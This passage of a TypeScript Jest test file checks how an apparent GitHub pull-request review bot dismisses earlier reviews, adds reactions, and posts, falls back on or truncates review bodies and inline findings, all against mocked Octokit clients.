    const warningSpy = jest.spyOn(core, 'warning').mockImplementation(() => {});
    const { octokit, updateComment, getComment } = makeOctokit([{ id: 2, body: 'Older' }]);

    await setSettingsBlock(octokit, 'owner', 'repo', 2, view);
    expect(updateComment).toHaveBeenCalledWith({ owner: 'owner', repo: 'repo', comment_id: 2, body: withSettingsBlock('Older', view) });

    getComment.mockRejectedValueOnce(new Error('gone'));
    await setSettingsBlock(octokit, 'owner', 'repo', 2, view);
    expect(updateComment).toHaveBeenCalledTimes(1);
    expect(warningSpy).toHaveBeenCalledWith(expect.stringContaining('Failed to update the settings block of comment 2'));
    warningSpy.mockRestore();
  });
});

describe('dismissPreviousReviews', () => {
  it('dismisses reviews with bot marker and CHANGES_REQUESTED state', async () => {
    const dismissMock = jest.fn().mockResolvedValue({});
    const mockOctokit = {
      paginate: jest.fn(paginateSinglePage),
      rest: {
        pulls: {
          listReviews: jest.fn().mockResolvedValue({
            data: [
              { id: 1, body: `${BOT_MARKER}\nSome review`, state: 'CHANGES_REQUESTED' },
              { id: 2, body: 'Human review', state: 'CHANGES_REQUESTED' },
              { id: 3, body: `${BOT_MARKER}\nApproved`, state: 'APPROVED' },
              { id: 4, body: `${BOT_MARKER}\nNew review`, state: 'CHANGES_REQUESTED' },
            ],
          }),
          dismissReview: dismissMock,
        },
      },
    } as unknown as Parameters<typeof dismissPreviousReviews>[0];

    await dismissPreviousReviews(mockOctokit, 'owner', 'repo', 1, 4);
    expect(dismissMock).toHaveBeenCalledTimes(1);
    expect(dismissMock).toHaveBeenCalledWith(expect.objectContaining({ review_id: 1 }));
  });

  it('keeps an approval of `keepCommit` and dismisses the ones of older commits', async () => {
    const dismissMock = jest.fn().mockResolvedValue({});
    const reviews = [
      { id: 1, body: `${BOT_MARKER}\nApproved`, state: 'APPROVED', commit_id: 'old' },
      { id: 2, body: `${BOT_MARKER}\nApproved`, state: 'APPROVED', commit_id: 'head' },
      { id: 3, body: `${BOT_MARKER}\nIncomplete`, state: 'COMMENTED', commit_id: 'head' },
    ];
    const mockOctokit = {
      paginate: jest.fn().mockResolvedValue(reviews),
      rest: { pulls: { dismissReview: dismissMock } },
    } as unknown as Parameters<typeof dismissPreviousReviews>[0];

    await dismissPreviousReviews(mockOctokit, 'owner', 'repo', 1, 3, 'APPROVED', 'head');
    expect(dismissMock.mock.calls).toEqual([[expect.objectContaining({ review_id: 1 })]]);
  });

  it('dismisses reviews past the first page', async () => {
    const dismissMock = jest.fn().mockResolvedValue({});
    const reviews = Array.from({ length: 35 }, (_, i) => ({ id: i + 1, body: `${BOT_MARKER}\nReview`, state: 'CHANGES_REQUESTED' }));
    const mockOctokit = {
      paginate: jest.fn().mockResolvedValue(reviews),
      rest: {
        pulls: {
          listReviews: jest.fn().mockResolvedValue({ data: reviews.slice(0, 30) }),
          dismissReview: dismissMock,
        },
      },
    } as unknown as Parameters<typeof dismissPreviousReviews>[0];

    const keepReviewId = reviews[reviews.length - 1].id;
    await dismissPreviousReviews(mockOctokit, 'owner', 'repo', 1, keepReviewId);

    expect(mockOctokit.paginate).toHaveBeenCalledWith(mockOctokit.rest.pulls.listReviews, expect.objectContaining({ per_page: 100 }));
    expect(dismissMock).toHaveBeenCalledTimes(reviews.length - 1);
    expect(dismissMock).not.toHaveBeenCalledWith(expect.objectContaining({ review_id: keepReviewId }));
  });

  it('warns instead of throwing when listing reviews fails', async () => {
    const warningSpy = jest.spyOn(core, 'warning').mockImplementation(() => {});
    const dismissMock = jest.fn();
    const mockOctokit = {
      paginate: jest.fn(paginateSinglePage),
      rest: {
        pulls: {
          listReviews: jest.fn().mockRejectedValue(new Error('Server Error')),
          dismissReview: dismissMock,
        },
      },
    } as unknown as Parameters<typeof dismissPreviousReviews>[0];

    await expect(dismissPreviousReviews(mockOctokit, 'owner', 'repo', 1, 4)).resolves.toBeUndefined();
    expect(dismissMock).not.toHaveBeenCalled();
    expect(warningSpy).toHaveBeenCalledWith(expect.stringContaining('Failed to dismiss previous reviews: Server Error'));
    warningSpy.mockRestore();
  });

  it('warns naming the review when a dismissal fails, and goes on', async () => {
    const warningSpy = jest.spyOn(core, 'warning').mockImplementation(() => {});
    const mockOctokit = {
      paginate: jest.fn(paginateSinglePage),
      rest: {
        pulls: {
          listReviews: jest.fn().mockResolvedValue({
            data: [{ id: 1, body: `${BOT_MARKER}\nReview`, state: 'CHANGES_REQUESTED' }],
          }),
          dismissReview: jest.fn().mockRejectedValue(new Error('Forbidden')),
        },
      },
    } as unknown as Parameters<typeof dismissPreviousReviews>[0];

    await expect(dismissPreviousReviews(mockOctokit, 'owner', 'repo', 1)).resolves.toBeUndefined();
    expect(warningSpy).toHaveBeenCalledWith('Could not dismiss the previous review #1, it still requests changes: Forbidden');
    warningSpy.mockRestore();
  });
});

describe('reactToIssueComment', () => {
  it('creates a reaction on an issue comment', async () => {
    const createMock = jest.fn().mockResolvedValue({});
    const mockOctokit = {
      rest: {
        reactions: {
          createForIssueComment: createMock,
        },
      },
    } as unknown as Parameters<typeof reactToIssueComment>[0];

    await reactToIssueComment(mockOctokit, 'owner', 'repo', 123, 'rocket');
    expect(createMock).toHaveBeenCalledWith({
      owner: 'owner',
      repo: 'repo',
      comment_id: 123,
      content: 'rocket',
    });
  });

  it('silently ignores reaction failures', async () => {
    const mockOctokit = {
      rest: {
        reactions: {
          createForIssueComment: jest.fn().mockRejectedValue(new Error('Forbidden')),
        },
      },
    } as unknown as Parameters<typeof reactToIssueComment>[0];

    await reactToIssueComment(mockOctokit, 'owner', 'repo', 123, '+1');
  });
});

describe('reactToReviewComment', () => {
  it('creates a reaction on a review comment', async () => {
    const createMock = jest.fn().mockResolvedValue({});
    const mockOctokit = {
      rest: {
        reactions: {
          createForPullRequestReviewComment: createMock,
        },
      },
    } as unknown as Parameters<typeof reactToReviewComment>[0];

    await reactToReviewComment(mockOctokit, 'owner', 'repo', 456, 'heart');
    expect(createMock).toHaveBeenCalledWith({
      owner: 'owner',
      repo: 'repo',
      comment_id: 456,
      content: 'heart',
    });
  });

  it('silently ignores reaction failures', async () => {
    const mockOctokit = {
      rest: {
        reactions: {
          createForPullRequestReviewComment: jest.fn().mockRejectedValue(new Error('Forbidden')),
        },
      },
    } as unknown as Parameters<typeof reactToReviewComment>[0];

    await reactToReviewComment(mockOctokit, 'owner', 'repo', 456, 'eyes');
  });
});

describe('postReview fallback paths', () => {
  it('retries without inline comments when line validation error occurs', async () => {
    const createReviewMock = jest.fn()
      .mockRejectedValueOnce(new Error('pull_request_review_thread.line must be part of the diff'))
      .mockResolvedValueOnce({ data: { id: 2 } });

    const mockOctokit = {
      rest: { pulls: { createReview: createReviewMock } },
    } as unknown as Parameters<typeof postReview>[0];

    const result: ReviewResult = {
      verdict: 'APPROVE',
      summary: 'Summary',
      findings: [{
        severity: 'warning',
        title: 'Some issue',
        file: 'src/a.ts',
        line: 10,
        description: 'Desc.',
        reviewers: ['Test'],
      }],
      highlights: [],
      reviewComplete: true,
      agentNames: [],
    };

    const reviewId = await postReview(mockOctokit, 'owner', 'repo', 1, 'sha', result);
    expect(reviewId).toEqual({ id: 2, approvalHeld: false });
    expect(createReviewMock).toHaveBeenCalledTimes(2);
    // Second call should have empty comments
    expect(createReviewMock.mock.calls[1][0].comments).toEqual([]);
  });

  const approveWithSuggestion: ReviewResult = {
    verdict: 'APPROVE',
    summary: 'All good.',
    findings: [{ severity: 'note', title: 'Minor thing', file: 'src/a.ts', line: 10, description: 'Desc.', reviewers: [] }],
    highlights: [],
    reviewComplete: true,
    agentNames: [],
  };

  it.each([
    ['the repo setting', 'GitHub Actions is not permitted to approve pull requests.', true],
    ['the repo setting, in its create-or-approve wording', 'GitHub Actions is not permitted to create or approve pull requests.', true],
    ['another reason', 'Review cannot be submitted', false],
  ])('falls back to COMMENT with the real error logged when GitHub refuses APPROVE for %s', async (_label, message, blamesSetting) => {
    const warningSpy = jest.spyOn(core, 'warning').mockImplementation(() => {});
    const createReviewMock = jest.fn()
      .mockRejectedValueOnce(Object.assign(new Error(message), { status: 422 }))
      .mockResolvedValueOnce({ data: { id: 3 } });
    const mockOctokit = {
      rest: { pulls: { createReview: createReviewMock, get: jest.fn().mockResolvedValue({ data: { head: { sha: 'sha' } } }) } },
    } as unknown as Parameters<typeof postReview>[0];

    const reviewId = await postReview(mockOctokit, 'owner', 'repo', 1, 'sha', approveWithSuggestion);

    expect(reviewId).toEqual({ id: 3, approvalHeld: false });
    expect(createReviewMock.mock.calls[1][0].event).toBe('COMMENT');
    const warning = warningSpy.mock.calls.map(c => String(c[0])).find(w => w.includes('Falling back to COMMENT'));
    expect(warning).toContain(`422: ${message}`);
    expect(warning?.includes('Allow GitHub Actions')).toBe(blamesSetting);
    warningSpy.mockRestore();
  });

  it('throws `SupersededError` and posts nothing when GitHub refuses APPROVE on a commit that is no longer the head', async () => {
    const createReviewMock = jest.fn().mockRejectedValue(Object.assign(new Error('Unprocessable Entity'), { status: 422 }));
    const mockOctokit = {
      rest: { pulls: { createReview: createReviewMock, get: jest.fn().mockResolvedValue({ data: { head: { sha: 'newer' } } }) } },
    } as unknown as Parameters<typeof postReview>[0];

    const posting = postReview(mockOctokit, 'owner', 'repo', 1, 'sha', approveWithSuggestion);

    await expect(posting).rejects.toBeInstanceOf(SupersededError);
    await expect(posting).rejects.toMatchObject({ reviewedSha: 'sha', headSha: 'newer' });
    expect(createReviewMock).toHaveBeenCalledTimes(1);
  });

  it('falls back to COMMENT when GitHub refuses REQUEST_CHANGES with a 422', async () => {
    const createReviewMock = jest.fn()
      .mockRejectedValueOnce(Object.assign(new Error('Can not request changes on your own pull request'), { status: 422 }))
      .mockResolvedValueOnce({ data: { id: 4 } });

    const mockOctokit = {
      rest: { pulls: { createReview: createReviewMock } },
    } as unknown as Parameters<typeof postReview>[0];

    const result: ReviewResult = {
      verdict: 'REQUEST_CHANGES',
      summary: 'Issues found.',
      findings: [{
        severity: 'blocker',
        title: 'Critical bug here',
        file: 'src/a.ts',
        line: 10,
        description: 'Desc.',
        reviewers: [],
      }],
      highlights: [],
      reviewComplete: true,
      agentNames: [],
    };

    const reviewId = await postReview(mockOctokit, 'owner', 'repo', 1, 'sha', result);
    expect(reviewId).toEqual({ id: 4, approvalHeld: false });
    expect(createReviewMock.mock.calls[1][0].event).toBe('COMMENT');
  });

  it.each([
    ['a 5xx', 502, 'Bad Gateway'],
    ['a rate limit', 403, 'API rate limit exceeded'],
    ['a missing permission', 403, 'Resource not accessible by integration'],
  ])('throws instead of downgrading REQUEST_CHANGES to COMMENT on %s', async (_label, status, message) => {
    const createReviewMock = jest.fn().mockRejectedValue(Object.assign(new Error(message), { status }));
    const octokit = {
      rest: { pulls: { createReview: createReviewMock } },
    } as unknown as Parameters<typeof postReview>[0];

    await expect(postReview(octokit, 'owner', 'repo', 1, 'sha', { verdict: 'REQUEST_CHANGES', summary: 'Issues found.', findings: [], highlights: [], reviewComplete: true, agentNames: [] })).rejects.toThrow(message);
    expect(createReviewMock).toHaveBeenCalledTimes(1);
  });

  it('throws when COMMENT event fails (no further fallback)', async () => {
    const createReviewMock = jest.fn().mockRejectedValue(new Error('API error'));
    const mockOctokit = {
      rest: { pulls: { createReview: createReviewMock } },
    } as unknown as Parameters<typeof postReview>[0];

    const result: ReviewResult = {
      verdict: 'COMMENT',
      summary: 'Comment.',
      findings: [{
        severity: 'note',
        title: 'Some issue',
        file: 'src/a.ts',
        line: 10,
        description: 'Desc.',
        reviewers: [],
      }],
      highlights: [],
      reviewComplete: true,
      agentNames: [],
    };

    await expect(postReview(mockOctokit, 'owner', 'repo', 1, 'sha', result)).rejects.toThrow('API error');
  });

  it('moves findings to body when diff file is not found', async () => {
    const createReviewMock = jest.fn().mockResolvedValue({ data: { id: 5 } });
    const mockOctokit = {
      rest: { pulls: { createReview: createReviewMock } },
    } as unknown as Parameters<typeof postReview>[0];

    const diff: ParsedDiff = {
      files: [{ path: 'src/other.ts', changeType: 'modified', hunks: [] }],
      totalAdditions: 5,
      totalDeletions: 0,
    };

    const result: ReviewResult = {
      verdict: 'APPROVE',
      summary: 'Summary',
      findings: [{
        severity: 'warning',
        title: 'Issue in missing file',
        file: 'src/missing.ts',
        line: 10,
        description: 'Desc.',
        reviewers: [],
        evidence: { checks: [], proof: ['src/missing.ts:10'] },
      }],
      highlights: [],
      reviewComplete: true,
      agentNames: [],
    };

    await postReview(mockOctokit, 'owner', 'repo', 1, 'sha', result, diff);
    const body = createReviewMock.mock.calls[0][0].body as string;
    expect(body).toContain('**Blockers in files outside this diff:**\n\n**Warning**\n**Issue in missing file**\n[`src/missing.ts:10`](https://github.com/owner/repo/blob/sha/src/missing.ts#L10)\n**What goes wrong:** Desc.\n<!-- manki-checks -->\n**Checked:** [`src/missing.ts:10`](https://github.com/owner/repo/blob/sha/src/missing.ts#L10)');
    expect(createReviewMock.mock.calls[0][0].comments).toEqual([]);
  });

  describe('blocking findings off changed lines', () => {
    const diff: ParsedDiff = {
      files: [
        { path: 'src/a.ts', changeType: 'modified', hunks: [{ oldStart: 1, oldLines: 3, newStart: 1, newLines: 3, content: '' }] },
        { path: 'src/renamed.ts', changeType: 'renamed', hunks: [] },
      ],
      totalAdditions: 1,
      totalDeletions: 0,
    };

    function buildResult(findings: Finding[]): ReviewResult {
      return { verdict: 'REQUEST_CHANGES', summary: 'Summary', findings, highlights: [], reviewComplete: true, agentNames: [] };
    }

    function makeOctokit(
      createReviewComment: jest.Mock,
      createReview = jest.fn().mockResolvedValue({ data: { id: 7 } }),
      updateReview = jest.fn().mockResolvedValue({}),
    ) {
      const octokit = {
        rest: { pulls: { createReview, createReviewComment, updateReview } },
      } as unknown as Parameters<typeof postReview>[0];
      return { octokit, createReview, updateReview };
    }

    const offLineBlocker: Finding = { severity: 'blocker', title: 'Refused thread', file: 'src/a.ts', line: 40, description: 'Desc.', reviewers: [] };

    it('posts blockers outside the hunks as file-level comments with the finding marker', async () => {
      const createReviewComment = jest.fn().mockResolvedValue({ data: { id: 1 } });
      const { octokit, createReview } = makeOctokit(createReviewComment);

      await postReview(octokit, 'owner', 'repo', 1, 'sha', buildResult([
        { severity: 'blocker', title: 'Unchanged line bug', file: 'src/a.ts', line: 40, description: 'Desc.', reviewers: [] },
        { severity: 'warning', title: 'Rename only', file: 'src/renamed.ts', line: 0, description: 'Desc.', reviewers: [] },
        { severity: 'blocker', title: 'On changed line', file: 'src/a.ts', line: 2, description: 'Desc.', reviewers: [] },
      ]), diff);

      expect(createReviewComment).toHaveBeenCalledTimes(2);
      expect(createReviewComment.mock.calls[0][0]).toEqual(expect.objectContaining({
        pull_number: 1, commit_id: 'sha', path: 'src/a.ts', subject_type: 'file',
      }));
      expect(createReviewComment.mock.calls[0][0]).not.toHaveProperty('line');
      expect(createReviewComment.mock.calls[0][0].body).toContain('<!-- manki:blocker:Unchanged-line-bug -->');
      expect(createReviewComment.mock.calls[1][0]).toEqual(expect.objectContaining({ path: 'src/renamed.ts', subject_type: 'file' }));
      expect(createReviewComment.mock.calls[1][0].body).toContain('<!-- manki:warning:Rename-only -->');

      const review = createReview.mock.calls[0][0];
      expect(review.comments).toHaveLength(1);
      expect(review.comments[0]).toEqual(expect.objectContaining({ path: 'src/a.ts', line: 2 }));
      expect(review.comments[0].body).toContain('<!-- manki:blocker:On-changed-line -->');
      expect(review.body).not.toContain('Findings (not on changed lines)');
    });

    it('posts no file-level comment when creating the review fails', async () => {
      const createReviewComment = jest.fn();
      const createReview = jest.fn().mockRejectedValue(Object.assign(new Error('Bad Gateway'), { status: 502 }));
      const { octokit } = makeOctokit(createReviewComment, createReview);

      await expect(postReview(octokit, 'owner', 'repo', 1, 'sha', buildResult([offLineBlocker]), diff)).rejects.toThrow('Bad Gateway');
      expect(createReviewComment).not.toHaveBeenCalled();
    });

    it('skips a file-level comment only when an open thread was posted for the same finding', async () => {
      const createReviewComment = jest.fn().mockResolvedValue({ data: { id: 1 } });
      const { octokit, createReview } = makeOctokit(createReviewComment);
      const thread = (title: string, line: number, status: 'open' | 'resolved' | 'replied') => ({
        title, file: 'src/a.ts', line, severity: 'blocker' as const, markerSlug: titleToSlug(title), threadId: `T-${title}`, status,
      });
      const findings: Finding[] = ['File thread', 'Nearby line thread', 'Resolved thread', 'Far line thread', 'Other file']
        .map(title => ({ ...offLineBlocker, title }));
      findings[4] = { ...findings[4], file: 'src/renamed.ts', line: 0 };
      // A finding taken out of its thread is posted on its own, even beside an open thread with its title.
      findings.push({ ...offLineBlocker, title: 'File thread', ownThread: true });

      const context = makeContext({
        findings: { count: findings.length, severityCounts: {}, entries: findings.map(f => ({ fingerprint: { file: f.file, lineStart: f.line, lineEnd: f.line, slug: titleToSlug(f.title) }, severity: 'blocker' as const })) },
      });
      await postReview(octokit, 'owner', 'repo', 1, 'sha', buildResult(findings), diff, context, undefined, {
        existingThreads: [
          thread('File thread', 0, 'open'),
          thread('Nearby line thread', 37, 'replied'),
          thread('Resolved thread', 0, 'resolved'),
          thread('Far line thread', 10, 'open'),
          thread('Other file', 0, 'open'),
        ],
      });

      const posted = createReviewComment.mock.calls.map(c => (c[0].body as string).match(/<!-- manki:blocker:(.+?) -->/)?.[1]);
      expect(posted).toEqual(['Resolved-thread', 'Far-line-thread', 'Other-file', 'File-thread']);
      // The record names the open thread each skipped blocker was left to, so resolving that thread can lift the block.
      const record = JSON.parse(extractReviewRecords(createReview.mock.calls[0][0].body as string).records[0]) as RoundContext;
      expect(record.findings.entries.map(e => [e.posted, e.threadId])).toEqual([
        ['earlier_thread', 'T-File thread'], ['earlier_thread', 'T-Nearby line thread'], ['thread', undefined], ['thread', undefined], ['thread', undefined], ['thread', undefined],
      ]);
    });

    it('points a blocker linked to an open thread, or repeating an answered one, at that thread instead of posting a new one', async () => {
      const createReviewComment = jest.fn().mockResolvedValue({ data: { id: 1 } });
      const { octokit, createReview } = makeOctokit(createReviewComment);
      const existingThreads = [{
        title: 'Floor class runs on one model', file: 'src/a.ts', line: 2, severity: 'blocker' as const, status: 'open' as const,
        threadId: 'T1', threadUrl: 'https://github.com/owner/repo/pull/1#discussion_r1', markerSlug: 'Floor-class-runs-on-one-model',
      }];
      const named = (line: number): Finding => ({ ...offLineBlocker, title: 'Floor class weakened by the PR', line, threadId: 'T1' });

      const answered: Finding = { ...named(2), threadId: undefined, answeredIn: { threadId: 'T1', answer: 'Withdrawn. Fine.' } };
      for (const finding of [named(2), named(40), answered]) {
        await postReview(octokit, 'owner', 'repo', 1, 'sha', { ...buildResult([finding]), outcome: 'ADDRESS_FIRST' }, diff, undefined, undefined, { existingThreads });
      }

      expect(createReviewComment).not.toHaveBeenCalled();
      for (const [review] of createReview.mock.calls) {
        expect(review.comments).toEqual([]);
        expect(review.body).toMatch(/^\u{1F534} \*\*Changes requested:\*\* 1 blocker still open from an earlier review\./u);
        expect(review.body).toContain('**Still open from earlier reviews:**\n- `src/a.ts:2`: Floor class runs on one model ([view thread](https://github.com/owner/repo/pull/1#discussion_r1))\n\n  This round names it as:\n\n  **Blocker**\n  **Floor class weakened by the PR**\n  [`src/a.ts:');
      }
      expect(createReview.mock.calls[1][0].body).toContain('  [`src/a.ts:40`](https://github.com/owner/repo/blob/sha/src/a.ts#L40)\n  **What goes wrong:** Desc.');
      // A blocker in a thread that did not block before is raised by this round, so the verdict counts it as new.
      await postReview(octokit, 'owner', 'repo', 1, 'sha', { ...buildResult([named(2)]), outcome: 'ADDRESS_FIRST' }, diff, makeContext({ meta: { ...makeContext().meta, round: 2 } }), undefined, {
        existingThreads: [{ ...existingThreads[0], severity: 'warning' as const }],
      });
      expect(createReview.mock.calls[3][0].comments).toEqual([]);
      expect(createReview.mock.calls[3][0].body).toMatch(/^\u{1F534} \*\*Changes requested:\*\* 1 new blocker\./u);
      await postReview(octokit, 'owner', 'repo', 1, 'sha', { ...buildResult([named(2)]), outcome: 'ADDRESS_FIRST' }, diff, makeContext({ meta: { ...makeContext().meta, round: 2 } }), undefined, {
        existingThreads: [{ ...existingThreads[0], severity: 'warning' as const, gradeUnknown: true }],
      });
      expect(createReview.mock.calls[4][0].body).toMatch(/^\u{1F534} \*\*Changes requested:\*\* 1 blocker still open from an earlier review\./u);
    });

    it.each([
      ['a 422', 422],
      ['a 5xx', 502],
    ])('adds a file-level comment GitHub refuses with %s to the posted review body', async (_label, status) => {
      const createReviewComment = jest.fn().mockRejectedValue(Object.assign(new Error('refused'), { status }));
      const { octokit, createReview, updateReview } = makeOctokit(createReviewComment);

      await postReview(octokit, 'owner', 'repo', 1, 'sha', buildResult([offLineBlocker]), diff);

      const review = createReview.mock.calls[0][0];
      expect(review.event).toBe('REQUEST_CHANGES');
      expect(review.comments).toEqual([]);
      expect(updateReview).toHaveBeenCalledTimes(1);
      const update = updateReview.mock.calls[0][0];
      expect(update.review_id).toBe(7);
      expect(update.body.startsWith(review.body.slice(0, review.body.lastIndexOf('\n\n<details>\n<summary>About this review')))).toBe(true);
      expect(update.body).toContain('**Blockers that could not be posted as threads:**\n\n**Blocker**\n**Refused thread**\n[`src/a.ts:40`](https://github.com/owner/repo/blob/sha/src/a.ts#L40)');
      expect(update.body).toMatch(/- Reviewed \[`sha`\]\([^)]+\)\n[^\n]*\n\n<\/details>\n\n<!-- manki-bot -->/);
    });

    it('records a finding GitHub refused as a thread as listed in the body, whichever post was refused', async () => {
      const onLine: Finding = { severity: 'blocker', title: 'On changed line', file: 'src/a.ts', line: 2, description: 'Desc.', reviewers: [] };
      const outside: Finding = { severity: 'blocker', title: 'Other file', file: 'src/b.ts', line: 5, description: 'Desc.', reviewers: [] };
      const findings = [onLine, offLineBlocker, outside];
      const context = makeContext({
        findings: { count: 3, severityCounts: { blocker: 3 }, entries: findings.map(f => ({ fingerprint: { file: f.file, lineStart: f.line, lineEnd: f.line, slug: titleToSlug(f.title) }, severity: 'blocker' as const })) },
      });
      const places = (body: string) => (JSON.parse(extractReviewRecords(body).records[0]) as RoundContext).findings.entries.map(e => e.posted);
      const post = async (createReview: jest.Mock, createReviewComment: jest.Mock) => {
        const { octokit, updateReview } = makeOctokit(createReviewComment, createReview);
        await postReview(octokit, 'owner', 'repo', 1, 'sha', buildResult(findings), diff, context);
        return [...createReview.mock.calls, ...updateReview.mock.calls].map(([args]) => places(args.body as string));
      };
      const taken = () => jest.fn().mockResolvedValue({ data: { id: 1 } });
      const refusedOnce = (error: Error) => jest.fn().mockRejectedValueOnce(error).mockResolvedValue({ data: { id: 7 } });
      const lineError = new Error('pull_request_review_thread.line must be part of the diff');
      const eventError = Object.assign(new Error('Unprocessable'), { status: 422 });

      // Nothing refused: the two findings GitHub can anchor have a thread, the one in a file outside the diff does not.
      expect(await post(taken(), taken())).toEqual([['thread', 'thread', 'body']]);
      // The file-level comment is refused after the review posted, so the review is updated with a corrected record.
      expect(await post(taken(), jest.fn().mockRejectedValue(new Error('refused')))).toEqual([['thread', 'thread', 'body'], ['thread', 'body', 'body']]);
      // The line comments are refused: the first attempt never posts, and the review that does has no line thread.
      expect(await post(refusedOnce(lineError), taken())).toEqual([['thread', 'thread', 'body'], ['body', 'thread', 'body']]);
      // Both are refused.
      expect(await post(refusedOnce(lineError), jest.fn().mockRejectedValue(new Error('refused'))))
        .toEqual([['thread', 'thread', 'body'], ['body', 'thread', 'body'], ['body', 'body', 'body']]);
      // GitHub refuses the review event, and the comment posted instead carries no line comment either.
      expect((await post(refusedOnce(eventError), taken())).at(-1)).toEqual(['body', 'thread', 'body']);
    });

    it('truncates the existing body, never the refused findings, when the review is near the size limit', async () => {
      const createReviewComment = jest.fn().mockRejectedValue(Object.assign(new Error('refused'), { status: 422 }));
      const { octokit, updateReview } = makeOctokit(createReviewComment);
      const result = { ...buildResult([{ ...offLineBlocker, cell: { row: 'severe', column: 'normal' } }]), summary: 'word '.repeat(11990) };
      const context = makeContext();

      await postReview(octokit, 'owner', 'repo', 1, 'sha', result, diff, context);

      const update = updateReview.mock.calls[0][0].body as string;
      expect(update).toContain('*(Review body truncated)*');
      expect(extractReviewRecords(update).records.map(r => JSON.parse(r))).toEqual([{ ...context, output: { bodyLength: expect.any(Number), commentLengths: [expect.any(Number)] } }]);
      expect(update).toContain('**Blockers that could not be posted as threads:**\n\n**Blocker**\n**Refused thread**\n[`src/a.ts:40`](https://github.com/owner/repo/blob/sha/src/a.ts#L40)\n**What goes wrong:** Desc.\n\n<!-- manki-issue-box -->\n- [ ] Create an issue for this <!-- manki-box:issue:src/a.ts:40:4846db4cafa8 -->\n\n<!-- manki-stats: ');
      expect(update.length).toBeLessThanOrEqual(60000 + 600);
    });

    it('fails the run naming the findings when they cannot fit in the review body', async () => {
      const createReviewComment = jest.fn().mockRejectedValue(Object.assign(new Error('refused'), { status: 422 }));
      const { octokit, updateReview } = makeOctokit(createReviewComment);
      const huge: Finding = { ...offLineBlocker, title: 'Huge '.repeat(12000) };

      await expect(postReview(octokit, 'owner', 'repo', 1, 'sha', buildResult([huge]), diff)).rejects.toThrow('(src/a.ts)');
      expect(updateReview).not.toHaveBeenCalled();
    });

    it('fails the run naming the finding when the refused comment cannot be added to the review either', async () => {
      const createReviewComment = jest.fn().mockRejectedValue(Object.assign(new Error('refused'), { status: 422 }));
      const updateReview = jest.fn().mockRejectedValue(new Error('update down'));
      const { octokit } = makeOctokit(createReviewComment, undefined, updateReview);

      // The review itself was created before the failure, and `onPosted` says so.
      const onPosted = jest.fn();
      await expect(postReview(octokit, 'owner', 'repo', 1, 'sha', buildResult([offLineBlocker]), diff, undefined, undefined, { onPosted }))
        .rejects.toThrow('"Refused thread" (src/a.ts)');
      expect(onPosted).toHaveBeenCalledTimes(1);
    });
  });
});

describe('postReview non-blocking findings', () => {
  const diff: ParsedDiff = {
    files: [{ path: 'src/a.ts', changeType: 'modified', hunks: [{ oldStart: 1, oldLines: 30, newStart: 1, newLines: 30, content: '' }] }],
    totalAdditions: 30,
    totalDeletions: 0,
  };

  function buildResult(findings: Finding[]): ReviewResult {
    return { verdict: 'APPROVE', summary: 'Summary', findings, highlights: [], reviewComplete: true, agentNames: [] };
  }

  function makeOctokit(files: Record<string, string> = {}) {
    const createReview = jest.fn().mockResolvedValue({ data: { id: 1 } });
    const createReviewComment = jest.fn();
    const getContent = jest.fn(async ({ path }: { path: string }) => {
      if (!(path in files)) throw Object.assign(new Error('Not Found'), { status: 404 });
      return { data: { content: Buffer.from(files[path]).toString('base64'), encoding: 'base64', size: files[path].length } };
    });
    const octokit = {
      rest: { pulls: { createReview, createReviewComment }, repos: { getContent } },
    } as unknown as Parameters<typeof postReview>[0];
    return { octokit, createReview, createReviewComment, getContent };
  }

  const nonBlocking = (severity: Finding['severity'], title: string, line: number, extra: Partial<Finding> = {}): Finding => ({
    severity, title, file: 'src/a.ts', line, description: 'It goes wrong. Second sentence. Third sentence.', reviewers: [], ...extra,
  });

  it('counts the findings posted as threads in the verdict line without listing them, and leaves the posted body as it is', async () => {
    const blocking = nonBlocking('blocker', 'Cache never expires', 5, { cell: { row: 'severe', column: 'normal' } });
    const fileLevel = nonBlocking('blocker', 'Lock order flips', 40, { cell: { row: 'severe', column: 'normal' } });
    const inline = nonBlocking('warning', 'Retry drops the error', 2, { tags: ['follow-up'] });
    const createReview = jest.fn().mockResolvedValue({ data: { id: 7 } });
    const updateReview = jest.fn().mockResolvedValue({});
    const createReviewComment = jest.fn().mockResolvedValue({ data: { id: 2 } });
    const octokit = { rest: { pulls: { createReview, createReviewComment, updateReview }, repos: { getContent: jest.fn().mockRejectedValue(new Error('Not Found')) } } } as unknown as Parameters<typeof postReview>[0];
    const result: ReviewResult = { ...buildResult([blocking, fileLevel, inline]), verdict: 'REQUEST_CHANGES', outcome: 'ADDRESS_FIRST', summary: 'It breaks.' };

    await postReview(octokit, 'owner', 'repo', 1, 'abc1234', result, diff);
    const { body, comments } = createReview.mock.calls[0][0];
    expect(comments).toHaveLength(2);
    expect(createReviewComment).toHaveBeenCalledTimes(1);
    // Each finding has its thread under the review, so the body only counts them, and needs no update to link them.
    expect(body).toMatch(/^\u{1F534} \*\*Changes requested:\*\* 2 blockers, plus 1 warning in threads\.\n\n\*\*What blocks:\*\* It breaks\./u);
    for (const f of [blocking, fileLevel, inline]) expect(body).not.toContain(f.title);
    expect(updateReview).not.toHaveBeenCalled();
  });

  it('shows a small code fix in the body as a diff against the flagged line, and anything else as before', async () => {
    const file = Array.from({ length: 60 }, (_, i) => `line ${i + 1}`);
    file[40] = '  return retry(fn);';
    file[42] = '  const out = `a` + b;';
    file[46] = 'const fence = "```";';
    file[47] = `const data = '${'x'.repeat(700)}';`;
    const { octokit, createReview } = makeOctokit({ 'src/a.ts': `${file.join('\r\n')}\r\n` });
    const longFix = Array.from({ length: 10 }, (_, i) => `step${i}();`).join('\n');

    await postReview(octokit, 'owner', 'repo', 1, 'abc1234', buildResult([
      nonBlocking('note', 'One line', 41, { suggestedFix: '  return retry(fn, 3);' }),
      nonBlocking('note', 'Two lines', 43, { suggestedFix: '  const head = `a`;\n  const out = head + b;' }),
      nonBlocking('note', 'Too long', 44, { suggestedFix: longFix }),
      nonBlocking('note', 'Past the end', 70, { suggestedFix: 'x();' }),
      nonBlocking('note', 'In prose', 45, { suggestedFix: 'Handle the `None` case separately.' }),
      nonBlocking('note', 'Fence in code', 47, { suggestedFix: 'const fence = "~~~";' }),
      nonBlocking('note', 'Minified', 48, { suggestedFix: 'const data = load();' }),
    ]), diff);
    const body = createReview.mock.calls[0][0].body as string;
    const fold = (title: string) => body.match(new RegExp(`<details>\n<summary>\\u2728 <b>${title}</b>[\\s\\S]*?\n</details>`, 'u'))![0];

    // The flagged line comes from the file at the reviewed commit, and the diff replaces the preview of it.
